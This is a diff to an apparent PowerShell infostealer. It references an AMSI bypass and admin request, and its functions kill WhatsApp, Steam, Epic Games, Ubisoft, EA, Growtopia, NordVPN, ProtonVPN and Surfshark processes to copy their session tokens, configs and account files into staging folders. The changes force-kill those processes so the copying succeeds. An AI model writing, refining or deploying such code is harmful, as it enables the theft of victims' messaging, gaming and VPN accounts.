@@ -54,6 +54,7 @@ public static class ProcessUtility
     }
 }
 "@
+#END OF CODE MADE BY EvilByteCode
 
 # Request admin with AMSI bypass
 function INVOKE-AC {
@@ -465,7 +466,7 @@ function Backup-Data {
     # Whatsapp Session Stealer
     function whatsappstealer {
         $processname = "whatsapp"
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         $whatsapp_session = "$folder_messaging\Whatsapp"
         New-Item -ItemType Directory -Force -Path $whatsapp_session
         $regexPattern = "WhatsAppDesktop"
@@ -485,7 +486,7 @@ function Backup-Data {
         $processname = "steam"
         $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
         if (!(Test-Path $steamfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         $steam_session = "$folder_gaming\Steam"
         New-Item -ItemType Directory -Force -Path $steam_session
         Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
@@ -512,7 +513,7 @@ function Backup-Data {
         $processname = "epicgameslauncher"
         $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
         if (!(Test-Path $epicgamesfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         $epicgames_session = "$folder_gaming\EpicGames"
         New-Item -ItemType Directory -Force -Path $epicgames_session
         Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
@@ -525,7 +526,7 @@ function Backup-Data {
         $processname = "upc"
         $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
         if (!(Test-Path $ubisoftfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue'-ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue'-ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         $ubisoft_session = "$folder_gaming\Ubisoft"
         New-Item -ItemType Directory -Force -Path $ubisoft_session
         Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
@@ -538,7 +539,7 @@ function Backup-Data {
         if (!(Test-Path $eafolder)) { return }
         $ea_session = "$folder_gaming\Electronic Arts"
         if (!(Test-Path $ea_session)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         New-Item -ItemType Directory -Force -Path $ea_session
         Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
     }
@@ -549,7 +550,7 @@ function Backup-Data {
         $growtopiafolder = "$env:localappdata\Growtopia"
         if (!(Test-Path $growtopiafolder)) { return }
         $growtopia_session = "$folder_gaming\Growtopia"
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         New-Item -ItemType Directory -Force -Path $growtopia_session
         Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
     }
@@ -562,7 +563,7 @@ function Backup-Data {
         $processname = "nordvpn"
         $nordvpnfolder = "$env:localappdata\nordvpn"
         if (!(Test-Path $nordvpnfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         $nordvpn_account = "$folder_vpn\NordVPN"
         New-Item -ItemType Directory -Force -Path $nordvpn_account
         $pattern = "^([A-Za-z]+\.exe_Path_[A-Za-z0-9]+)$"
@@ -586,7 +587,7 @@ function Backup-Data {
         $processname = "protonvpn"
         $protonvpnfolder = "$env:localappdata\protonvpn"  
         if (!(Test-Path $protonvpnfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         $protonvpn_account = "$folder_vpn\ProtonVPN"
         New-Item -ItemType Directory -Force -Path $protonvpn_account
         $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
@@ -609,7 +610,7 @@ function Backup-Data {
         $processname = "Surfshark"
         $surfsharkvpnfolder = "$env:appdata\Surfshark"
         if (!(Test-Path $surfsharkvpnfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         $surfsharkvpn_account = "$folder_vpn\Surfshark"
         New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
         Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
